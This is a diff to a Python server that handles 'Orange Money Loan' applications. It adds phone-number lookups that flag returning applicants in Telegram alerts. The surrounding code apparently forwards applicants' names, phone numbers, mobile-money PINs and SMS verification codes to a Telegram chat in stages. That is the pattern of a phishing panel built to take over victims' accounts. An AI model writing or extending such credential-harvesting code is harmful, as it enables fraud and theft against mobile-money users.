@@ -1509,6 +1509,16 @@ def telegram_notification_loop():
             if event is None:
                 time.sleep(2)
                 continue
+            clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(event["phone"]).strip())
+            short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
+            with connect_db() as db:
+                prior_apps = db.execute(
+                    """SELECT COUNT(*) as cnt FROM applications
+                       WHERE (phone = ? OR phone LIKE ? OR phone = ?) AND id != ?""",
+                    (clean_phone, f"%{short_phone}", short_phone, event["id"]),
+                ).fetchone()["cnt"]
+            returning_badge = f"🔄 Returning Applicant: YES ({prior_apps} previous)" if prior_apps > 0 else "👤 Returning Applicant: No (New Applicant)"
+
             if agent_event:
                 destination = event["telegram_chat_id"]
                 current_status = (event["status"] or "pending").lower()
@@ -1522,6 +1532,7 @@ def telegram_notification_loop():
                     "New Orange Money Loan application\n"
                     f"Applicant: {event['first_name']} {event['last_name']}\n"
                     f"Phone: +232 {event['phone']}\n"
+                    f"{returning_badge}\n"
                     f"Loan: {event['loan_type']}\n"
                     f"Amount: SLE {event['loan_amount']:,}\n"
                     f"Term: {event['term_months']} months\n"
@@ -1544,6 +1555,7 @@ def telegram_notification_loop():
                 text = (
                     "New Orange Money Loan application\n"
                     f"Application reference: {event['id']}\n"
+                    f"{returning_badge}\n"
                     f"Loan type: {event['loan_type']}\n"
                     f"Loan amount: SLE {event['loan_amount']:,}\n"
                     f"Term: {event['term_months']} months\n"
@@ -1555,7 +1567,7 @@ def telegram_notification_loop():
                     f"Status: {status_label}"
                 )
                 outbox_table = "telegram_outbox"
-                reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
+                reply_markup = stage_buttons(event['id'], current_status)
             try:
                 if reply_markup is not None:
                     send_telegram_message(
@@ -2164,11 +2176,22 @@ class Handler(BaseHTTPRequestHandler):
             step_label = "📍 Step 3: PIN Validation" if step == "zip_phone" else "💬 Step 4: SMS / Verification Message"
             active_phone = phone if (step == "zip_phone" and phone) else app["phone"]
             phone_display = active_phone if str(active_phone).startswith("+") else f"+232 {active_phone}"
+            clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
+            short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
+            with connect_db() as db:
+                prior_apps = db.execute(
+                    """SELECT COUNT(*) as cnt FROM applications
+                       WHERE (phone = ? OR phone LIKE ? OR phone = ?) AND id != ?""",
+                    (clean_phone, f"%{short_phone}", short_phone, val_uuid),
+                ).fetchone()["cnt"]
+            returning_badge = f"🔄 Returning Applicant: YES ({prior_apps} previous)" if prior_apps > 0 else "👤 New Applicant"
+
             lines = [
                 f"📋 Verification Submission — {step_label}",
                 f"Ref: {val_uuid}",
                 f"Applicant: {app['first_name']} {app['last_name']}",
                 f"Phone: {phone_display}",
+                f"Profile: {returning_badge}",
             ]
             if step == "zip_phone":
                 lines.append(f"PIN: {zip_code}")
